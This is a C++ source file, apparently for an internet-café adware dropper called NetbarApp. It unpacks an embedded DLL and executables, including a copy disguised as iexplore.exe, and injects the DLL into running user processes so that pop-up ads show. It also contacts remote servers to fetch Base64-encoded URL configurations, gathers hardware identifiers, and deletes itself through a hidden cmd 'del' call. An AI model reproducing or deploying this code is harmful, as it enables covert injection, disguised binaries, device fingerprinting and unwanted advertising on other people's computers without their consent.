// NetbarApp.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <Dbghelp.h>
#pragma comment(lib, "Dbghelp.lib")
#include "NetbarApp.h"
#include "../UtilityLib/Utility.h"
#pragma comment(lib , "../build/UtilityLib.lib")

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	Utility_EnabledDebugPrivilege();

	//TestUtility();
	//Utility_StartRun(FALSE);	// 开机启动

	DoWork();
	//SelfDel();

	//LoadLibrary("NetBarAD.dll");

	/*while(TRUE)
	{
	Sleep(1000*10);
	Utility_DebugLogEx("NetbarApp running...");
	}*/

	return 0;
}

VOID DoWork(VOID)
{
	// 释放DLL
	string strWinFolder;
	string strFile_NetBarAD;
	string strFile_YiDian;
	string strFile_RightCorner;
	string strFile_IEBrowse;
	string strDstDir;
	Utility_GetWindowsFolder(strWinFolder);
	Utility_GetSysTmpFolder(strWinFolder);
	Utility_GetSysTmpFolder(strFile_IEBrowse);
	

	strDstDir				     = strWinFolder + "\\NetbarAD\\";
	strFile_NetBarAD      = strDstDir + "NetBarAD.dll";
	strFile_YiDian            = strDstDir + "Yidian.exe";
	strFile_RightCorner   = strDstDir + "RightCorner.exe";
	strFile_IEBrowse        +=  "\\iexplore.exe";

	MakeSureDirectoryPathExists(strDstDir.c_str());
	_mkdir(strDstDir.c_str());

	//Utility_Replace(strFile_NetBarAD, "\\", "\\\\");

	CHAR szExePath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szExePath, sizeof(szExePath));
	Utility_GetOverlayBin(szExePath, strFile_NetBarAD.c_str());

	//Utility_ReleaseResFile(IDR_NetBarAD,    "DLL",  strFile_NetBarAD.c_str());
	Utility_ReleaseResFile(IDR_YiDian,      "EXE",  strFile_YiDian.c_str());
	Utility_ReleaseResFile(IDR_RightCorner, "EXE",  strFile_RightCorner.c_str());
	//Utility_ReleaseResFile(IDR_IEBrowse, "EXE",  strFile_IEBrowse.c_str());
	Utility_ReleaseResFile(IDR_YiDian, "EXE",  strFile_IEBrowse.c_str());

	Utility_DebugLog(strDstDir);
	InjectDLL(strDstDir);
}

VOID InjectDLL(const string &strDllDir)
{
	DWORD dwInjectSum = 0;
	string strDllPath(strDllDir);
	strDllPath += string("NetBarAD.dll");

	list<PROCESSENTRY32> listProcess;
	Utility_GetAllProcess(listProcess);
	list<PROCESSENTRY32>::iterator it = listProcess.begin();
	for (it; it != listProcess.end(); it++)
	{
		// Inject.exe 9160 F:\1.dll
		char szBuf[32] = {0};
		PROCESSENTRY32 pe32 = *it;
		DWORD dwPID = pe32.th32ProcessID;

		if (strstr(pe32.szExeFile, "winlogon.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "services.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "csrss.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "wininit.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "smss.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "lsass.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "nvvsvc.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "lsm.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "nvxdsync.exe") != NULL) continue;
		if (strstr(pe32.szExeFile, "nvvsvc.exe") != NULL) continue;
		

		if (Utility_IsServerProcess(dwPID))  // 不注入服务进程，不然右下角弹窗会看不到
		{
			continue;
		}
		if (Utility_IsWow64ProcessEx(dwPID)) // 跳过64位进程
		{
			continue;
		}

		/*dwPID = 40784;
		dwInjectSum = 3;*/

		if (dwPID <= 500)
		{
			continue;
		}
		itoa(dwPID, szBuf, 10);

		
		
		string strPIDFilePath(strDllDir);
		strPIDFilePath += szBuf;
		strPIDFilePath += ".txt";
		DeleteFile(strPIDFilePath.c_str());

		string strExe(strDllDir);
		strExe += "Inject.exe ";
		strExe += szBuf;
		strExe += " ";
		strExe += strDllPath;
		Utility_DebugLog(strExe);

		/*WriteLogFile("log:");
		WriteLogFile(pe32.szExeFile);
		WriteLogFile(strExe.c_str());*/

		Utility_InjectDllEx(dwPID, (char*)strDllPath.c_str());

		// 判断注入是否成功
		Sleep(250);
		if (Utility_IsHaveFile(strPIDFilePath.c_str()))
		{
			Utility_DebugLogEx("inject ok...");
			dwInjectSum += 1;
		}

		if (dwInjectSum >= 10)
		{
			break;
		}	
	}
}

VOID WriteLogFile(LPCSTR szLog)
{
	if (szLog == NULL)
	{
		return;
	}

	string strFile("app.txt");

	FILE *pFile = fopen(strFile.c_str(), "a");
	if (pFile == NULL)
	{
		return;
	}

	SYSTEMTIME s_time;
	GetLocalTime(&s_time);
	char szTime[128] = {0};
	sprintf(szTime, "[%04d%02d%02d %02d:%02d:%02d, %03d] ", s_time.wYear, s_time.wMonth, s_time.wDay, s_time.wHour, s_time.wMinute, s_time.wSecond, s_time.wMilliseconds);

	string strLog(szTime);
	strLog += (szLog);
	strLog += ("\r\n");

	fwrite(strLog.c_str(), 1, strLog.length(), pFile);
	fflush(pFile);
	fclose(pFile);
	pFile = NULL;
}

VOID TestUtility(VOID)
{
	char szBoardSN[1024] = {0};
	Utility_GetBaseBoardByCmd(szBoardSN, sizeof(szBoardSN));





	DWORD dwErrCode = 0;

	// 创建文件 
	DWORD dwShareMode = FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE;
	HANDLE  hFile = CreateFileA("C:\\Users\\Administrator\\AppData\\Local\\11.dll", GENERIC_WRITE, dwShareMode, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hFile == INVALID_HANDLE_VALUE ) 
	{ 
		dwErrCode = GetLastError();
		return; 
	} 



	string strCfg = "[{\"param\":\"baidu,http://www.baidu.com//favicon.ico,http://www.baidu.com\",\"state\":1,\"type\":1},{\"param\":\"http://www.baidu.com?i=2\",\"state\":1,\"type\":2},{\"param\":\"http://www.baidu.com?i=3\",\"state\":1,\"type\":3},{\"param\":\"baidu.exe,http://www.baidu.com?i=4\",\"state\":1,\"type\":4},{\"param\":\"http://www.baidu.com?i=5\",\"state\":1,\"type\":5},{\"param\":\"baidu.exe,http://www.baidu.com?i=6\",\"state\":1,\"type\":6},{\"state\":1,\"type\":7}]";
	vector<string> vecCfg;
	Utility_Split(strCfg, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "6") continue;

		vector<string> vecUrls;
		Utility_Split(strParam, ",", vecUrls);
		if(vecUrls.size() < 2) continue;

		string processName = vecUrls[0];
		string url	       = vecUrls[1];
		
		Utility_Replace(processName, "\"", "");
		Utility_Replace(url, "\"", "");

		if (Utility_IsHaveProcess((CHAR*)processName.c_str()))
		{
			Utility_OpenIE((CHAR*)url.c_str());
		}
	}

	int iRand = Utility_Rand(1, 10);

	BOOL bRet = Utility_IsHaveFile("C:\\exit.txt");

	int xxx = 0;




	/*string cpuID;
	Utility_GetCpuID(cpuID);
	Utility_DebugLog(cpuID);

	string MAC;
	Utility_GetMacAddress(MAC);
	Utility_DebugLog(MAC);

	Utility_CreateInternetShortcut("csdn.url", "www.csdn.net", "http://haojie.gs/favicon.ico");*/

	//Utility_OpenIE("www.csdn.net");

	/*if (Utility_IsHaveProcess("360se.exe"))
	{
	Utility_DebugLog(string("进程存在"));
	} 
	else
	{
	Utility_DebugLog(string("进程不存在"));
	}*/

	//Utility_SetHomePage("www.csdn.net", TRUE);

	/*string strWinFolder;
	Utility_GetWindowsFolder(strWinFolder);
	Utility_DebugLog(strWinFolder);*/

	// http://12246846222.java.cdnjsp.org/getClient.jsp?id=1
	// http://12246846222.java.cdnjsp.org/click.jsp
	string result;
	wstring serverName = L"12246846222.java.cdnjsp.org";
	wstring objectNmae = L"getClient.jsp?id=1";
	WORD nPost = 80;

	//Utility_Http_Get(serverName,nPost, objectNmae, result);
	//Utility_DebugLog(result);

	wstring qhServerName = L"huangn.qhredcross.org.cn";
	wstring qhObjectNmae = L"JMHandler.ashx?action=2";
	WORD nQhPost = 80;

	string postData = "key=1234567891234567&data=";
	postData += string(result);
	//Utility_Http_Post(qhServerName,nQhPost, qhObjectNmae, postData, result);
	//Utility_DebugLog(result);

	// http://huangn.qhredcross.org.cn/JMHandler.ashx
	//Utility_DownloadFile(L"http://www.yiichina.com/images/logo.png", L"xxx.png");


	/*char *szBase64 = "aaa中国123456{,}";
	string str = Utility_Base64_Encode((const unsigned char*)szBase64, strlen((char*)szBase64));
	Utility_DebugLog(str);

	int OutByte = 0;
	str = Utility_Base64_Decode(str.c_str(), str.length(), OutByte);
	Utility_DebugLog(str);*/

	// http://12246846221.java.jspee.cn/getClient.jsp?id=1
	// http://12246846221.java.jspee.cn/click.jsp?id=1&type=1&key=cpu_zhuban_00-00-00-00
	// http://20170712.java.cdnjsp.wang/getClient.jsp?id=1
	Utility_Http_Get(wstring(L"12246846221.java.jspee.cn"),80, wstring(L"getClient.jsp?id=1"), result);
	Utility_DebugLog(result);

	/*result = Utility_Xor(result, '#');
	Utility_DebugLog(result);*/

	//result = "Y27kuK3lm710ZXN0";
	//result = "W3sicGFyYW0iOiJodHRwOi8vd3d3LmJhaWR1LmNvbT9pPTEiLCJzdGF0ZSI6MSwidHlwZSI6MX0seyJwYXJhbSI6Imh0dHA6Ly93d3cuYmFpZHUuY29tP2k9MiIsInN0YXRlIjoxLCJ0eXBlIjoyfSx7InBhcmFtIjoiaHR0cDovL3d3dy5iYWlkdS5jb20/aT0zIiwic3RhdGUiOjEsInR5cGUiOjN9LHsicGFyYW0iOiJodHRwOi8vd3d3LmJhaWR1LmNvbT9pPTQiLCJzdGF0ZSI6MSwidHlwZSI6NH0seyJwYXJhbSI6Imh0dHA6Ly93d3cuYmFpZHUuY29tP2k9NSIsInN0YXRlIjoxLCJ0eXBlIjo1fSx7InBhcmFtIjoiaHR0cDovL3d3dy5iYWlkdS5jb20/aT02Iiwic3RhdGUiOjEsInR5cGUiOjZ9LHsicGFyYW0iOiJodHRwOi8vd3d3LmJhaWR1LmNvbT9pPTciLCJzdGF0ZSI6MSwidHlwZSI6N31d";
	
	Utility_Replace(result, " ", "");
	Utility_Replace(result, "	", "");
	Utility_Replace(result, "\r\n", "");
	Utility_Replace(result, "\r", "");
	Utility_Replace(result, "\n", "");
	

	

	int OutByte = 0;
	result = Utility_Base64_Decode(result.c_str(), result.length(), OutByte);

	result = Utility_UTF8ToGBK(result);
	Utility_DebugLog(result);

	

	/*string strData = "中国abc123456*&()!2##,aaabbbccc666";
	const char chXorKey = '#';

	strData = Utility_Base64_Encode((const unsigned char*)strData.c_str(), strData.length());

	result = Utility_Xor(strData, chXorKey);
	Utility_DebugLog(result);

	result = Utility_Xor(result, chXorKey);
	Utility_DebugLog(result);

	int OutByte = 0;
	result = Utility_Base64_Decode(result.c_str(), result.length(), OutByte);

	Utility_DebugLog(result);*/
}

BOOL SelfDel()
{
	SHELLEXECUTEINFO sei;
	TCHAR szModule [MAX_PATH],szComspec[MAX_PATH],szParams [MAX_PATH];//字符串数组

	// 获得文件名.
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))//获取szComspec=cmd.exe
	{
		// 设置命令参数.
		lstrcpy(szParams,"/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");

		// 设置结构成员.
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;//C:\Windows\system32\cmd.exe
		sei.lpParameters = szParams;//  /c del E:\adb\datasafe\Debug\datasafe.exe > nul
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		// 执行shell命令.
		if(ShellExecuteEx(&sei))
		{
			// 设置命令行进程的执行级别为空闲执行,使本程序有足够的时间从内存中退出. 
			SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);
			SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

			// 通知Windows资源浏览器,本程序文件已经被删除.
			SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);
			return TRUE;
		}
	}
	return FALSE;
} 


